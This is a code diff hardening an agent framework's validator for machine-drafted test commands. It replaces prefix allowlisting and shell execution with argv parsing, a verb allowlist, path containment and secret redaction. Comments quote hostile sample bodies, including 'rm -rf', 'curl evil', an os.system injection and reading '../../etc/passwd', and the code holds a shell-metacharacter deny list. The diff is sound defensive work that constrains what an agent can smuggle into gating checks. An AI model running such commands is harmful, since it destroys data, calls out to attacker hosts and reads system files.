@@ -79,7 +79,9 @@ import base64
 import concurrent.futures
 import hashlib
 import json
+import posixpath
 import re
+import shlex
 import subprocess
 import sys
 import tempfile
@@ -89,8 +91,8 @@ from collections.abc import Callable
 from pathlib import Path
 from typing import Any
 
-from hooks import _praxis
-from hooks import _ticket_state as _ts
+from agent_factory._hooks import _praxis
+from agent_factory._hooks import _ticket_state as _ts
 
 from agent_factory.rubric import rubric_from_dict, rubric_to_dict
 
@@ -187,19 +189,47 @@ def transition_enforcement_state(current_state: str | None, event: str) -> str:
     return ENFORCEMENT_TRANSITIONS[key]
 
 
-# KD8 anchor 4: a machine-drafted run body must validate against a declared command
-# template/allowlist at schema-validation time — evidence-steered drafting cannot smuggle an
-# arbitrary command that hash-pinning would then legitimize. A human-authored (plan-time or
-# lenient-channel) run body is exempt — a human already reviewed it.
-RUN_BODY_ALLOWED_PREFIXES = (
-    "pytest", "python -m", "python3 -m", "npm test", "npm run", "npx playwright",
-    "make ", "grep ", "ruff ", "mypy ", "eslint ", "playwright test",
-)
-_RUN_BODY_FORBIDDEN_TOKENS = (";", "&&", "|", "`", "$(", ">", "<")
+# KD8 anchor 4: a drafted run body must validate at schema-validation time — evidence-steered
+# drafting cannot smuggle an arbitrary command that hash-pinning would then legitimize.
+#
+# Validation is SHAPE-BASED, not prefix-based, and it is executed as an ARGV VECTOR (never through
+# a shell), because prefix matching over a string that later reaches ``shell=True`` is not a
+# boundary at all: ``"pytest -q\nrm -rf /tmp/x"``, ``"pytest -q & curl evil"``,
+# ``"python -m timeit __import__('os').system('curl evil')"`` and ``"grep -R x ../../etc/passwd"``
+# all carry an allowlisted prefix and no ``&&``/``;`` token. Every one of them is refused here.
+#
+# The allowlist applies on EVERY channel, ``human`` included. The ``channel`` field says which
+# ENTRY POINT a body arrived through; it never says a human read the command. ``af_learn``
+# hardcodes ``channel="human"`` while the AGENT drafts the run body out of the user's free-text
+# prose, so treating "human" as reviewed let arbitrary verbs land as GATING checks. The only way
+# past the allowlist is the explicit, recorded ``human_verbatim=True`` waiver on :func:`ingest`
+# (see :func:`_validate_run_body`), which the drafting path (``af_learn.learn``) cannot set.
+RUN_BODY_ALLOWED_VERBS = frozenset({
+    "pytest", "python", "python3", "npm", "npx", "make", "grep", "ruff", "mypy",
+    "eslint", "playwright",
+})
+# Sub-shape constraints for the verbs whose FIRST argument decides whether the command is a test
+# runner or an arbitrary-code evaluator.
+_PYTHON_ALLOWED_MODULES = frozenset({"pytest", "unittest"})
+_NPM_ALLOWED_SUBCOMMANDS = frozenset({"test", "run"})
+_NPX_ALLOWED_TOOLS = frozenset({"playwright"})
+
+# Any of these in the raw body means the author is reaching for a shell. There is no shell.
+_RUN_BODY_FORBIDDEN_CHARS = (";", "&", "|", "`", "$", ">", "<", "(", ")", "{", "}")
+_PATH_SEP_RE = re.compile(r"[/\\]")
+# An absolute path in any syntax a runner would honour: POSIX ``/x``, UNC/Windows ``\x`` and
+# ``C:\x``. Anchored, so it matches the VALUE of a flag, never the flag itself.
+_ABSOLUTE_PATH_RE = re.compile(r"^(?:[A-Za-z]:)?[/\\]")
+# Line-breaking and control characters, matching ``hooks._ticket_state._LINE_BREAKING_RE``: C0
+# (``\x00-\x1f``), DEL + the C1 block (``\x7f-\x9f`` — U+0085 NEL and U+009B CSI are line-breaking
+# and are Unicode category Cc just like ``\n``), and the Unicode line/paragraph separators.
+_RUN_BODY_CONTROL_RE = re.compile(r"[\x00-\x1f\x7f-\x9f\u2028\u2029]")
 
 
 class RunBodyRejected(ValueError):
-    """A machine-drafted run body falls outside the declared command allowlist (KD8 anchor 4)."""
+    """A drafted run body failed run-body validation (KD8 anchor 4): unparseable, carrying a
+    control character or shell metacharacter, escaping path containment, or (machine channel)
+    falling outside the declared verb allowlist."""
 
 
 class CheckContentDrifted(ValueError):
@@ -289,24 +319,148 @@ def _require_authenticated(identity: str | None = None) -> str:
 
 # --------------------------------------------------------------------------- KD8: allowlist + hash pins
 
-def _validate_run_body(run: str, *, channel: str) -> str:
-    """Validate a drafted check's run body (KD8 anchor 4). A ``machine`` channel body must start
-    with a declared command template and carry no shell-metacharacter escape; a ``human`` channel
-    body (plan-time / lenient) is exempt — already reviewed."""
-    body = str(run or "").strip()
-    if not body:
-        raise RunBodyRejected("run body is empty")
-    if channel == "machine":
-        if not body.startswith(RUN_BODY_ALLOWED_PREFIXES):
+def _path_values(token: str) -> list[str]:
+    """Every substring of one argv token that a runner could interpret as a PATH.
+
+    The token itself is one (``../../etc``, ``/etc/passwd``), and — because ``--flag=value`` is a
+    single argv token — so is the value side of any ``=``. Checking only the token as a whole is
+    what let ``--rootdir=/etc``, ``--basetemp=/etc/x`` and ``--include=/etc/*`` through: none of
+    them START with a separator, the path does.
+
+    The ``=`` split deliberately does NOT require a leading dash. Tools take ``key=value`` as a
+    bare token routinely (``pytest -o cache_dir=/etc/x``, ``make VAR=/etc``), and requiring the
+    dash re-opened the whole class one token to the right of the flag — the first version of this
+    function did exactly that, and ``-o cache_dir=/etc/x`` was accepted on both channels.
+
+    LIMIT, stated rather than implied: this is LEXICAL containment. It cannot see a symlink, so an
+    in-tree ``etclink -> /etc`` makes ``etclink/passwd`` read outside the tree and this function
+    will accept it. Resolving symlinks needs the tree, which exists only at execution time — see
+    the runner in ``resolution.py``. An attacker able to plant that symlink can already commit a
+    malicious test, so this is a documented gap, not a silent one."""
+    values = [token]
+    if "=" in token:
+        values.append(token.split("=", 1)[1])
+    return values
+
+
+def _reject_unsafe_argument(token: str, body: str) -> None:
+    """Path containment for ONE parsed argv token: every path-shaped value inside it must resolve
+    to a location INSIDE the tree the check runs in — no absolute path, no ``~`` home reference,
+    and no ``..`` that normalizes above the working directory. A check runs against the tree it was
+    pinned to, not ``/etc/passwd``.
+
+    Containment is enforced by construction rather than by comparing against a repo root captured
+    at validation time: the pinned body is executed with ``cwd`` set to the target worktree
+    (:func:`_default_worktree_runner`), and a relative path that normalizes without a leading
+    ``..`` cannot name anything outside that ``cwd``, whatever it happens to be."""
+    for value in _path_values(token):
+        if not value:
+            continue
+        if _ABSOLUTE_PATH_RE.match(value):
             raise RunBodyRejected(
-                f"machine-drafted run body {body!r} is outside the declared command "
-                f"template/allowlist {RUN_BODY_ALLOWED_PREFIXES!r}"
+                f"run body {body!r} argument {token!r} names the absolute path {value!r} — a "
+                f"check runs against the tree it was pinned to, not an arbitrary filesystem "
+                f"location"
             )
-        for token in _RUN_BODY_FORBIDDEN_TOKENS:
-            if token in body:
-                raise RunBodyRejected(
-                    f"machine-drafted run body {body!r} contains disallowed shell token {token!r}"
-                )
+        if value.startswith("~"):
+            raise RunBodyRejected(
+                f"run body {body!r} argument {token!r} names the home-relative path {value!r}, "
+                f"which resolves outside the tree the check runs in"
+            )
+        normalized = posixpath.normpath(value.replace("\\", "/"))
+        if ".." in _PATH_SEP_RE.split(value) or normalized == ".." or normalized.startswith("../"):
+            raise RunBodyRejected(
+                f"run body {body!r} argument {token!r} escapes path containment: {value!r} "
+                f"resolves to {normalized!r}, above the tree the check runs in"
+            )
+
+
+def parse_run_body(run: str) -> list[str]:
+    """Parse a run body into the ARGV VECTOR it will be executed as, refusing anything that is not
+    a single, containable, shell-free command (KD8 anchor 4).
+
+    This is the ONE parser: :func:`_validate_run_body` calls it before a check is ever written, and
+    the executors (:func:`_default_runner` / :func:`_default_worktree_runner`) call it again to
+    produce the argv they hand to :func:`subprocess.run` with ``shell=False``. A body that survives
+    validation therefore cannot mean something different at execution time than it meant at
+    insertion time — there is no shell in between to reinterpret it."""
+    body = str(run or "")
+    if not body.strip():
+        raise RunBodyRejected("run body is empty")
+    control = _RUN_BODY_CONTROL_RE.search(body)
+    if control:
+        raise RunBodyRejected(
+            f"run body {body!r} contains control character {control.group()!r} — a "
+            f"newline/tab/NUL/NEL/CSI is a command separator, not whitespace"
+        )
+    for ch in _RUN_BODY_FORBIDDEN_CHARS:
+        if ch in body:
+            raise RunBodyRejected(
+                f"run body {body!r} contains disallowed shell metacharacter {ch!r}"
+            )
+    try:
+        argv = shlex.split(body)
+    except ValueError as exc:
+        raise RunBodyRejected(f"run body {body!r} is not parseable as a command ({exc})") from exc
+    if not argv:
+        raise RunBodyRejected(f"run body {body!r} parses to no command at all")
+    for token in argv:
+        _reject_unsafe_argument(token, body)
+    return argv
+
+
+def _validate_allowlisted_argv(argv: list[str], body: str) -> None:
+    """The VERB allowlist and its per-verb argument shape (KD8 anchor 4), applied on EVERY channel.
+    A verb that can evaluate arbitrary code (``python``, ``npm``, ``npx``) is constrained by its
+    first argument, not merely by its name — ``python -m timeit <expr>`` is not
+    ``python -m pytest``."""
+    verb, rest = argv[0], argv[1:]
+    if verb not in RUN_BODY_ALLOWED_VERBS:
+        raise RunBodyRejected(
+            f"drafted run body {body!r} invokes {verb!r}, outside the declared verb "
+            f"allowlist {sorted(RUN_BODY_ALLOWED_VERBS)}"
+        )
+    if verb in ("python", "python3"):
+        if len(rest) < 2 or rest[0] != "-m" or rest[1] not in _PYTHON_ALLOWED_MODULES:
+            raise RunBodyRejected(
+                f"drafted run body {body!r} must be "
+                f"'{verb} -m <{'|'.join(sorted(_PYTHON_ALLOWED_MODULES))}> ...' — no other "
+                f"interpreter invocation may be drafted by a machine"
+            )
+    elif verb == "npm":
+        if not rest or rest[0] not in _NPM_ALLOWED_SUBCOMMANDS:
+            raise RunBodyRejected(
+                f"drafted run body {body!r} must be 'npm "
+                f"<{'|'.join(sorted(_NPM_ALLOWED_SUBCOMMANDS))}> ...'"
+            )
+    elif verb == "npx":
+        if not rest or rest[0] not in _NPX_ALLOWED_TOOLS:
+            raise RunBodyRejected(
+                f"drafted run body {body!r} must be 'npx "
+                f"<{'|'.join(sorted(_NPX_ALLOWED_TOOLS))}> ...'"
+            )
+
+
+def _validate_run_body(run: str, *, channel: str, human_verbatim: bool = False) -> str:
+    """Validate a drafted check's run body (KD8 anchor 4) and return the body as it will be stored
+    and hash-pinned.
+
+    EVERY channel is parsed, shape-checked (:func:`parse_run_body`) AND verb-allowlisted
+    (:func:`_validate_allowlisted_argv`). ``channel`` records the entry point; it is deliberately
+    NOT an authorization level — D6: ``af_learn`` hardcodes ``channel="human"`` while the AGENT
+    drafts the command from the user's free-text prose, so exempting "human" from the allowlist
+    exempted exactly the bodies nobody reviewed, and let arbitrary verbs land as GATING checks.
+
+    ``human_verbatim`` is the ONE escape hatch, for a command a human typed out themselves and a
+    caller is vouching for. It is explicit, per-call, and recorded on the resulting check
+    (``verb_allowlist_waived``); the drafting path (:func:`agent_factory.af_learn.learn`) has no
+    parameter that reaches it, so an agent cannot set it. It waives the VERB allowlist only —
+    parsing, control-character rejection, metacharacter rejection and path containment still
+    apply, because those are properties of "there is no shell", not of who typed the command."""
+    body = str(run or "").strip()
+    argv = parse_run_body(body)
+    if not human_verbatim:
+        _validate_allowlisted_argv(argv, body)
     return body
 
 
@@ -322,7 +476,18 @@ def _hash_rubric(rubric: dict[str, Any]) -> str:
 def verify_pin(check: dict[str, Any]) -> None:
     """Refuse (raise :class:`CheckContentDrifted`) when a check's LIVE content no longer matches
     its insertion-time hash pin — binary checks by ``run`` body hash, graded checks by canonical
-    rubric-JSON hash (KD8 anchor 1). Called by :func:`execute_check` before it ever runs anything."""
+    rubric-JSON hash (KD8 anchor 1). Called by :func:`execute_check` before it ever runs anything.
+
+    THREAT MODEL — D5, stated plainly so nobody mistakes this for what it is not. The pin is an
+    UNKEYED hash stored in the same ``meta`` dict as the content it covers. It detects DRIFT:
+    content edited (by a later patch, a partial write, a hand-fix in Praxis) without the pin being
+    updated in the same motion. It does NOT detect TAMPERING: anyone with write access to the fact
+    can set ``meta.run`` and ``meta.run_hash`` together and this function will happily accept the
+    result, because it can only ask "does this hash match this content", never "did an authorized
+    party author this content". Resisting that would need a signature keyed to something the
+    attacker does not hold; there is no such key here. Write access to the ``building-validation``
+    snapshot is therefore the real trust boundary — the pin narrows the window for accidents and
+    half-applied edits, and that is the whole of its guarantee."""
     meta = check.get("meta") or {}
     check_id = meta.get("check_id", "<unknown>")
     if meta.get("kind") == "graded":
@@ -346,12 +511,15 @@ def execute_check(check: dict[str, Any], *, runner: Callable[[str], bool] | None
     if meta.get("kind") == "graded":
         raise ValueError("execute_check runs binary checks only; graded checks are judge-scored")
     run = str(meta.get("run") or "")
-    do_run = runner or _default_shell_runner
+    do_run = runner or _default_runner
     return bool(do_run(run))
 
 
-def _default_shell_runner(run: str) -> bool:  # pragma: no cover - real subprocess, exercised via injection in tests
-    return subprocess.run(run, shell=True, check=False).returncode == 0
+def _default_runner(run: str) -> bool:  # pragma: no cover - real subprocess, exercised via injection in tests
+    """Execute a validated run body as an ARGV VECTOR — never ``shell=True`` (D5). The body is
+    re-parsed (and therefore re-validated) here, so even a check whose stored body somehow bypassed
+    insertion-time validation cannot reach a shell."""
+    return subprocess.run(parse_run_body(run), check=False).returncode == 0
 
 
 # --------------------------------------------------------------------------- R7/KD8: secret redaction
@@ -428,7 +596,10 @@ def _pin_content(meta: dict[str, Any], *, validated_run: str | None,
     ``meta`` at insertion (KD8 anchor 1) — the ONE place :func:`ingest` and
     :func:`plan_time_author_check` both go through, so the pin scheme never has to be kept in
     sync by hand across the two authoring paths. Does NOT validate: the caller runs
-    :func:`_validate_run_body` itself, once, before any write (KD8 anchor 4)."""
+    :func:`_validate_run_body` itself, once, before any write (KD8 anchor 4).
+
+    The pin it writes is an unkeyed hash of the content it sits beside — a DRIFT detector, not a
+    tamper seal; see :func:`verify_pin` for the honest threat model."""
     if rubric is not None:
         rubric_dict = rubric_to_dict(rubric_from_dict(rubric))
         meta["kind"] = "graded"
@@ -455,6 +626,35 @@ def attempt_proof(run: str | None, *, proof_runner: Callable[[str], bool] | None
 
 # --------------------------------------------------------------------------- the six verbs (R1/R1b)
 
+def _bind_resurrected_check(check_id: str, project: str, prior_meta: dict[str, Any], *,
+                            ticket_ids: list[str] | None, surfaces: list[str] | None,
+                            lesson_id: str | None, wave_id: str,
+                            identity: str | None = None) -> dict[str, Any] | None:
+    """D4/R12 — extend a RESURRECTED check's narrow binding to the recurrence that resurrected it.
+
+    :func:`resurrect_check` only flips ``enforcement_state``; on its own that leaves a check bound
+    to whatever tickets it was drafted against, so :func:`ingest`'s regress of the CURRENT tickets
+    points at a gate that will never resolve onto them. This UNIONs the new ticket ids and observed
+    surfaces onto the prior binding (never replacing it — the prior scope is still legitimate) and
+    records the recurrence's lesson/wave so the resurrection stays auditable. Returns ``None`` when
+    there is nothing new to bind."""
+    prior_applies = [t for t in (prior_meta.get("applies_to") or []) if t]
+    prior_surfaces = [s for s in (prior_meta.get("surfaces") or []) if s]
+    applies_to = sorted(set(prior_applies) | {t for t in (ticket_ids or []) if t})
+    merged_surfaces = sorted(set(prior_surfaces) | {s for s in (surfaces or []) if s})
+    if applies_to == sorted(set(prior_applies)) and merged_surfaces == sorted(set(prior_surfaces)):
+        return None
+    return _patch_check(check_id, project, {
+        "applies_to": applies_to,
+        "surfaces": merged_surfaces,
+        # A binding that now names live ticket ids is no longer a surface-only fallback.
+        "surface_only": not applies_to and bool(merged_surfaces),
+        "resurrection_lesson_id": lesson_id,
+        "resurrection_wave_id": wave_id,
+        "rebound_at": time.time(),
+    }, identity=identity)
+
+
 def ingest(lesson_text: str, project: str, *, source: str | None = None,
           drafted_run: str | None = None, drafted_rubric: dict[str, Any] | None = None,
           channel: str = "machine", class_hint: str | None = None,
@@ -467,7 +667,7 @@ def ingest(lesson_text: str, project: str, *, source: str | None = None,
           repeat_count: int = DEFAULT_REPEAT_COUNT, redraft_budget: int = DEFAULT_REDRAFT_BUDGET,
           run_candidates: list[str] | None = None,
           proof_executor: Callable[[str, Path], bool] | None = None,
-          commit_sha: str | None = None) -> dict[str, Any]:
+          commit_sha: str | None = None, human_verbatim: bool = False) -> dict[str, Any]:
     """R1 — the full ingestion sequence, as one call: classify/dedup → write lesson →
     draft check (allowlist-validated when machine-drafted, hash-pinned at insertion) → attempt
     a fail-then-pass proof → bind at the narrowest scope → activate → regress the
@@ -484,8 +684,22 @@ def ingest(lesson_text: str, project: str, *, source: str | None = None,
     rides along on each regressed ticket's ``regression_detail`` entry as the BASELINE a later
     re-regression of the same ticket by this same check compares against; see
     :func:`regress_by_check`, the entry point for "an already-existing check failed this ticket
-    again", which is where the auto-suspend streak (:func:`attempt_auto_suspend`) actually acts."""
+    again", which is where the auto-suspend streak (:func:`attempt_auto_suspend`) actually acts.
+
+    D6: ``human_verbatim`` waives the VERB allowlist for a run body a human typed themselves and
+    the CALLER is vouching for — explicit, per-call, stamped on the check as
+    ``verb_allowlist_waived`` and recorded in the decision log. ``channel="human"`` does NOT waive
+    it: ``af_learn`` sets that channel for a body the AGENT drafted from free-text prose, and
+    ``af_learn`` exposes no argument that reaches ``human_verbatim``."""
     authenticated_as = _require_authenticated(identity)
+
+    # D7 — ``lesson_text`` becomes the lesson body (written into the ORG-SHARED cross-project
+    # learnings space), the check's criterion text, AND the ``reason`` on every regressed ticket's
+    # regression_detail entry. It is drafted from failure output, which routinely contains a token
+    # or key. Redact ONCE here, at the boundary, so every downstream use of it is redacted by
+    # construction. (The FL4 repro BUNDLE stays deliberately unredacted — see :func:`pin_artifact`
+    # — because breaking reproduction is worse than a secret in evidence prose.)
+    lesson_text = redact_secrets(lesson_text)
 
     use_real_proof_engine = (
         drafted_rubric is None and drafted_run is not None
@@ -501,9 +715,12 @@ def ingest(lesson_text: str, project: str, *, source: str | None = None,
         raw_candidates = list(run_candidates or [])
         if drafted_run not in raw_candidates:
             raw_candidates.insert(0, drafted_run)
-        validated_candidates = [_validate_run_body(c, channel=channel) for c in raw_candidates]
+        validated_candidates = [_validate_run_body(c, channel=channel,
+                                                   human_verbatim=human_verbatim)
+                                for c in raw_candidates]
     elif drafted_run is not None and drafted_rubric is None:
-        validated_run = _validate_run_body(drafted_run, channel=channel)
+        validated_run = _validate_run_body(drafted_run, channel=channel,
+                                           human_verbatim=human_verbatim)
 
     classification = classify_and_dedup(lesson_text, class_hint=class_hint)
     wave_id = uuid.uuid4().hex
@@ -557,8 +774,20 @@ def ingest(lesson_text: str, project: str, *, source: str | None = None,
         resurrected = resurrection is not None and resurrection["resurrected"]
         if resurrected:
             resurrected_check = resurrection["check"]
-            check_id = resurrected_check.get("id")
-            proof_status = (resurrected_check.get("meta") or {}).get("proof_status")
+            resurrected_meta = resurrected_check.get("meta") or {}
+            # D1: the AUTHORED id (``meta.check_id``), not the Praxis fact id — every lifecycle
+            # verb resolves through ``_fetch_check``, which queries ``meta={"check_id": ...}``.
+            check_id = resurrected_meta.get("check_id") or resurrected_check.get("id")
+            proof_status = resurrected_meta.get("proof_status")
+            # D4 — resurrection must BIND, not just flip enforcement_state. Without this the
+            # resurrected check keeps its ORIGINAL applies_to, the tickets regressed below never
+            # resolve it, and each one reruns, pins nothing, passes, recurs, and eventually parks
+            # blocked citing a check that never applied to it. Same narrow-scope binding the
+            # authoring branch does (R12), UNIONed onto the prior binding rather than replacing it.
+            _bind_resurrected_check(check_id, project, resurrected_meta,
+                                    ticket_ids=ticket_ids, surfaces=surfaces,
+                                    lesson_id=lesson_id, wave_id=wave_id,
+                                    identity=authenticated_as)
         else:
             applies_to = list(ticket_ids or [])
             surface_only = not applies_to and bool(surfaces)  # R12: zero-match ingestion binds surface-only
@@ -569,6 +798,17 @@ def ingest(lesson_text: str, project: str, *, source: str | None = None,
                 "authored_by": authenticated_as, "failure_class_id": class_id,
             }
             _pin_content(check_meta, validated_run=validated_run, rubric=drafted_rubric)
+            if human_verbatim and validated_run is not None:
+                # D6 — the verb-allowlist waiver is never silent: it is stamped on the check and
+                # written to the decision log, so an off-allowlist GATING check is always
+                # traceable to the caller that vouched for it.
+                check_meta["verb_allowlist_waived"] = True
+                _praxis.record_episode(
+                    f"verb-allowlist WAIVED for check on {project}: {authenticated_as} vouched "
+                    f"for a human-typed run body ({validated_run[:120]}) outside "
+                    f"RUN_BODY_ALLOWED_VERBS.",
+                    outcome="pending",
+                )
             if proof_status is None:
                 if drafted_rubric is not None:
                     proof_status = "unproven"  # graded checks are judge-scored, not fail-then-pass proof-run
@@ -590,8 +830,13 @@ def ingest(lesson_text: str, project: str, *, source: str | None = None,
             )
             check_meta[M_ENFORCEMENT_STATE] = transition_enforcement_state(None, insert_event)
 
-            written_check = write_check(lesson_text, project, meta=check_meta, source=source)
-            check_id = written_check.get("id")
+            write_check(lesson_text, project, meta=check_meta, source=source)
+            # D1: return the AUTHORED id, never the Praxis fact id the write ack carries. Every
+            # lifecycle verb (upgrade_on_first_pass / suspend / widen / regress_by_check / ...)
+            # resolves its argument through ``_fetch_check``, which queries
+            # ``meta={"check_id": ...}``; handing back the fact id made every one of them raise
+            # ValueError, so a report_only check could never be upgraded and stranded forever.
+            check_id = check_meta["check_id"]
 
             if proof_result is not None and proof_result.get("flag"):
                 _praxis.record_episode(
@@ -703,8 +948,10 @@ def regress_with_ingestion(project: str, ticket_ids: list[str], lesson_text: str
     if not use_real_proof_engine or merge_budget_s is None:
         result = _do_ingest(executor=proof_executor)
         if no_check_drafted:
+            # D7: same boundary redaction ``ingest`` applies — this entry lands on the ticket.
             _regress_with_evidence(project, ticket_ids, {
-                "source": "ingestion-api", "reason": lesson_text, "lesson_id": result["lesson_id"],
+                "source": "ingestion-api", "reason": redact_secrets(lesson_text),
+                "lesson_id": result["lesson_id"],
             })
         return result
 
@@ -722,7 +969,7 @@ def regress_with_ingestion(project: str, ticket_ids: list[str], lesson_text: str
     # `ingest`, whose own regress call is still pending inside the running future) so the "merge
     # proceeds" guarantee does not itself wait on the proof.
     _regress_with_evidence(project, ticket_ids, {
-        "source": "ingestion-api", "reason": lesson_text, "proof_pending": True,
+        "source": "ingestion-api", "reason": redact_secrets(lesson_text), "proof_pending": True,
     }, extra_meta={_ts.M_PROOF_PENDING: True})
 
     plan_kw = {"space": project, "snapshot": f"prd-{project}"}
@@ -834,13 +1081,22 @@ def promote_universal(criterion: str, run: str, *, recurring_projects: list[str]
 
     Returns ``{"status": "refused", "reason": "insufficient-recurrence", "distinct_projects": [...]}``
     on refusal, or ``{"status": "promoted", "check_id": "promoted-...", ...}`` on success.
+
+    D4 — this is the WIDEST-blast-radius write in the system: the promoted snapshot is org-wide and
+    ``hooks._ticket_state.universal_requirements`` merges it into the GATING set of every
+    non-exempt ticket in every project. It therefore goes through BOTH anchors like any other
+    authored check — :func:`_validate_run_body` (KD8 anchor 4, machine channel: allowlisted verb,
+    no shell metacharacter, contained paths) before anything is written, and :func:`_pin_content`
+    (KD8 anchor 1) so the org-wide body carries a ``run_hash`` and :func:`verify_pin` can refuse a
+    drifted one instead of running it everywhere.
     """
     authenticated_as = _require_authenticated(identity)
     distinct = sorted({str(p) for p in (recurring_projects or []) if p})
     if len(distinct) < MIN_DISTINCT_PROJECTS_FOR_PROMOTION:
         return {"status": "refused", "reason": "insufficient-recurrence", "distinct_projects": distinct}
 
-    canonical_hash = _canonical_content_hash(criterion, run)
+    validated_run = _validate_run_body(run, channel="machine")
+    canonical_hash = _canonical_content_hash(criterion, validated_run)
     for existing in read_promoted_universals():
         existing_meta = existing.get("meta") or {}
         if existing_meta.get("canonical_content_hash") == canonical_hash:
@@ -853,10 +1109,11 @@ def promote_universal(criterion: str, run: str, *, recurring_projects: list[str]
     check_id = f"{PROMOTED_UNIVERSAL_PREFIX}{uuid.uuid4().hex[:12]}"
     meta: dict[str, Any] = {
         "check_id": check_id, "applies_to": ["*"], "scope": "validation",
-        M_ENFORCEMENT_STATE: STATE_GATING, "promoted": True, "run": run,
+        M_ENFORCEMENT_STATE: STATE_GATING, "promoted": True,
         "canonical_content_hash": canonical_hash, "recurring_projects": distinct,
         "promoted_at": time.time(), "promoted_by": authenticated_as,
     }
+    _pin_content(meta, validated_run=validated_run, rubric=None)
     _praxis.ensure_space(_praxis.FACTORY_LEARNINGS_SPACE, name="factory-learnings")
     written = _write_insight(criterion, PROMOTED_UNIVERSAL_CATEGORY, source=source, meta=meta,
                              snapshot=_praxis.FACTORY_PROMOTED_UNIVERSALS_SNAPSHOT)
@@ -894,24 +1151,33 @@ def regression_streak(regression_entries: list[dict[str, Any]], check_id: str) -
     """R19 — the trailing run-length of regressions against ``check_id`` on ONE ticket's
     accumulated ``regression_detail`` (oldest first) that carry NO RELEVANT CHANGE between them.
 
-    Walking from the newest entry backward, the run continues while each entry names this SAME
-    ``check_id`` and, when it carries a ``commit_sha``, that sha agrees with the one the run has
-    already settled on (a differing sha is evidence something changed; an entry with no sha at all
-    carries no such evidence and never breaks an otherwise-matching run). The run ends the moment
-    an entry names a different check (or no check) — that regression is not this false-positive's
-    doing.
+    "No relevant change" is an EVIDENCE claim, and the evidence is the recorded ``commit_sha``.
+    Walking from the newest entry backward, the run continues only while each entry (a) names this
+    SAME ``check_id``, (b) is not already stamped ``resolved`` (a closed finding is not part of a
+    live false-positive run), and (c) CARRIES a ``commit_sha`` that agrees with the one the run has
+    already settled on.
+
+    D3: an entry with NO ``commit_sha`` ends the run. Absence of evidence that nothing changed is
+    not evidence that nothing changed — and since both regress entry points default
+    ``commit_sha=None`` and the shell writers supply none, the old "a missing sha never breaks the
+    run" reading collapsed "N regressions with no relevant change" into plain "N regressions",
+    which auto-suspends a CORRECT gating check that caught three genuinely different defects and
+    then writes a lesson asserting it is a false positive. Suspension is destructive; it requires
+    positive evidence.
     """
     streak = 0
     marker: Any = None
-    marker_seen = False
     for entry in reversed([e for e in (regression_entries or []) if isinstance(e, dict)]):
         if str(entry.get("check_id") or "") != str(check_id):
             break
+        if entry.get("resolved"):
+            break
         sha = entry.get("commit_sha")
-        if sha is not None:
-            if marker_seen and sha != marker:
-                break
-            marker, marker_seen = sha, True
+        if not sha:
+            break
+        if marker is not None and sha != marker:
+            break
+        marker = sha
         streak += 1
     return streak
 
@@ -1012,28 +1278,27 @@ def regress_by_check(project: str, ticket_id: str, check_id: str, reason: str, *
     """R19 — regress ONE ticket against an ALREADY-EXISTING gating check that just failed it
     AGAIN: the real-world shape "N consecutive regressions of the same ticket by the same check"
     counts (a freshly-drafted check, see :func:`ingest`, has by construction never regressed
-    anything twice yet). Accumulates the ``regression_detail`` entry — carrying ``check_id`` and
-    ``commit_sha`` so :func:`regression_streak` can tell a genuinely NEW regression (a different
-    commit landed) from the SAME one resubmitted with no relevant change — and, in the SAME
-    motion, checks whether this regression just crossed the auto-suspend threshold
-    (:func:`attempt_auto_suspend`) — never a caller's separate responsibility to remember."""
-    authenticated_as = _require_authenticated(identity)
-    plan_kw = {"space": project, "snapshot": f"prd-{project}"}
-    existing = _praxis.get_fact(ticket_id, **plan_kw) or {}
-    entries = _ts.accumulate_regression_detail(
-        (existing.get("meta") or {}).get("regression_detail"),
-        {"source": "ingestion-api", "reason": reason, "check_id": check_id, "commit_sha": commit_sha},
+    anything twice yet).
+
+    D2: this is now a THIN ADAPTER over :func:`regress_for_check`, not a second regress
+    implementation. The two used to diverge — this one auto-suspended but never bumped the
+    regress-cycle count (so the cap could never trip) and never revoked a live lease (reopening the
+    FINISH-over-regression race), while ``regress_for_check`` did both of those but never
+    auto-suspended (making the whole false-positive signal inert for :func:`ingest`, its only
+    caller). There is one path now, and it carries all three guarantees."""
+    outcome = regress_for_check(
+        project, [ticket_id], check_id,
+        {"source": "ingestion-api", "reason": reason, "check_id": check_id,
+         "commit_sha": commit_sha},
+        identity=identity,
     )
-    _praxis.regress_requirements(project, [ticket_id],
-                                 detail={ticket_id: {"regression_detail": entries}})
-    auto_suspend = attempt_auto_suspend(check_id, project, ticket_id, entries,
-                                        identity=authenticated_as)
-    return {"regression_detail": entries, "auto_suspend": auto_suspend}
+    return {"regression_detail": outcome["regression_detail"].get(ticket_id, []),
+            "auto_suspend": outcome["auto_suspend"].get(ticket_id)}
 
 
 def regress_for_check(project: str, ticket_ids: list[str], check_id: str, entry: dict[str, Any], *,
                       identity: str | None = None,
-                      cap: int = DEFAULT_REGRESS_CYCLE_CAP) -> dict[str, list[str]]:
+                      cap: int = DEFAULT_REGRESS_CYCLE_CAP) -> dict[str, Any]:
     """FL8 (R8/D2/D5, E1/E2) — regress ``ticket_ids`` against ONE already-identified ``check_id``,
     tracking each ticket's own regress-cycle count for THIS (ticket, check) pair
     (:data:`hooks._ticket_state.M_REGRESS_CYCLES`).
@@ -1047,11 +1312,23 @@ def regress_for_check(project: str, ticket_ids: list[str], check_id: str, entry:
     never silent), and it sits out of the churn set for operator action — never an unbounded silent
     regress loop.
 
-    Returns ``{"regressed": [...], "parked": [...]}`` (ticket ids in each outcome)."""
+    D2/R19 — and, in the SAME motion, every ticket touched here has its own accumulated history
+    re-examined for the false-positive streak (:func:`attempt_auto_suspend`), so a check that keeps
+    regressing the same ticket at the same commit gets suspended no matter WHICH entry point drove
+    the regression. This used to live only in :func:`regress_by_check`, which :func:`ingest` never
+    called — the feature was inert by construction. A PARKED ticket is examined too: hitting the
+    cycle cap with no relevant change in between is the strongest false-positive signal there is.
+
+    Returns a dict with ``regressed`` / ``parked`` (ticket ids in each outcome) plus
+    ``regression_detail`` and ``auto_suspend``, each a per-ticket-id mapping — the accumulated
+    finding LIST that was written, and that ticket's auto-suspend verdict."""
     authenticated_as = _require_authenticated(identity)
     plan_kw = {"space": project, "snapshot": f"prd-{project}"}
     detail: dict[str, Any] = {}
-    outcome: dict[str, list[str]] = {"regressed": [], "parked": []}
+    outcome: dict[str, Any] = {"regressed": [], "parked": []}
+    # Per-ticket accumulated finding LISTS (never a bare dict -- see accumulate_regression_detail).
+    detail_by_ticket: dict[str, list[dict[str, Any]]] = {}
+    suspend_by_ticket: dict[str, Any] = {}
     for tid in ticket_ids:
         existing = _praxis.get_fact(tid, **plan_kw) or {}
